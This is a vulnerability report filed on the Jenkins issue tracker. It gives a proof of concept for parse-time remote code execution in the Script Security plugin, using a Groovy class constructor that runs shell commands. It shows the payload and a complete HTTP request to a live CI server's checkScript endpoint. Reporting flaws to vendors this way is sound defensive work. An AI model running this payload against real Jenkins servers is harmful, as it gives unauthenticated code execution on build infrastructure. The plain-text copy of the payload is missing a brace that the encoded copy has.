The following was submitted to issues.jenkins.io:

 	[script-security] RCE with ANONYMOUS_READ=True via class constructor 

The  request  below ([2]) is a POC for RCE via ScriptSecurity Plugin, bypassing all the new restrictions from recent patches. The payload is as follows:

 public class Tst {
	public Tst()
		"ping -c 1 example.com".execute()
	}
}

The payload is parse-time RCE in groovy.parse that does not use any annotations. The reason this works is because GroovyShell.parse calls InvokerHelper.createScript (parseClass(codeSource)) and InvokerHelper.createScript calls scriptClass.newInstance();

My understanding is that this only works if the script contains only the class itself.

This vector is also very useful for old jenkins deployments that do not have AstTest and have broken Grab annotation (i.e. jenkins that ship with groovy 1.8.9)

This vector also bypasses the script sandbox.

 

 [2]POST /job/Core/job/acceptance-test-harness/job/master/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript HTTP/1.1
Host: ci.jenkins-ci.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID.8247ddfa=node0i1viqmbf86jyg4dcljuxxakt50659.node0; screenResolution=1366x768
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Jenkins-Crumb: 4e55e61fe8bf52239bf29352227c0942
Upgrade-Insecure-Requests: 1
Content-Length: 336value=%70%75%62%6c%69%63%20%63%6c%61%73%73%20%54%73%74%7b%0a%09%70%75%62%6c%69%63%20%54%73%74%28%29%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%22%70%69%6e%67%20%2d%63%20%31%20%74%7a%77%78%72%38%6d%38%6f%36%37%33%37%37%75%66%66%63%64%6e%74%76%6b%71%32%68%38%38%77%78%2e%70%30%77%2e%70%77%22%2e%65%78%65%63%75%74%65%28%29%0a%09%7d%0a%7d%0a
